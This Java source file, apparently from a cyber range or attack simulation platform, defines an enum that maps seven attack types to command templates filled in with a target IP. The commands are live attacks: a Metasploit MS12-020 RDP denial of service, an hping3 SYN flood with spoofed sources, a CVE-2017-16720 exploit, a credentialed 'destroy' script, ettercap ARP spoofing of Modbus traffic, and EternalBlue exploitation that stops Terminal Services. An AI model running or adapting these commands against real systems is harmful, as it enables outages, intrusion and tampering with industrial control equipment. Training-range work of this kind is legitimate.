package cn.cyberpeace.mp.base.bo;

import java.util.List;

public enum AttackType {
    // 中断
    ZHONGDUAN(1, "", "msfconsole -q -x \"use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; set RHOSTS ${ip}; run; exit\""),

    // 降效
    JIANGXIAO(2, "", "hping3 -q -n --rand-source -S -p 80 --flood ${ip}"),

    // 嗅探
    XIUTAN(3, "sniffing", "nmap -sV ${ip}"),

    //操控
    CAOKONG(4, "", "python3 CVE-2017-16720.py ${ip}"),

    //瘫毁
    TANHUI(5, "destroyed", "./auto-destory.exp ${ip} ${username} ${password}"),

    //欺骗
    QIPIAN(6, "deception", "ettercap -T -F modbus.ef -q -M ARP:remote -w /tmp/network.pcap //192.168.1.89/502 //${modbuscan_ip}/"),

    //拒止
    JUZHI(7, "denial-of-service-attack", "msfconsole -q -x \"use windows/smb/ms17_010_eternalblue; set RHOSTS ${ip}; set PAYLOAD windows/x64/exec;set CMD 'net stop termservice /Y';run;exit;\" ");

    private int type;

    private String flowType;

    private String cmd;

    AttackType(int type, String flowType,String cmd) {
        this.type = type;
        this.cmd = cmd;
        this.flowType = flowType ;
    }

    public int getType() {
        return type;
    }

    public String getCmd() {
        return cmd;
    }

    public String getFlowType() {
        return flowType;
    }

    public static AttackType getByType(int type) {
        for (AttackType value : values()) {
            if (value.type == type) {
                return value;
            }
        }
        return null;
    }

    public static String getFormatCmd(int type, List<ImageToolRequest.Params> params) {
        String cmd = getByType(type).getCmd();
        for(var p:params){
            cmd = cmd.replace("${" + p.getName() + "}", p.getValue());
        }
        return cmd;
    }
}
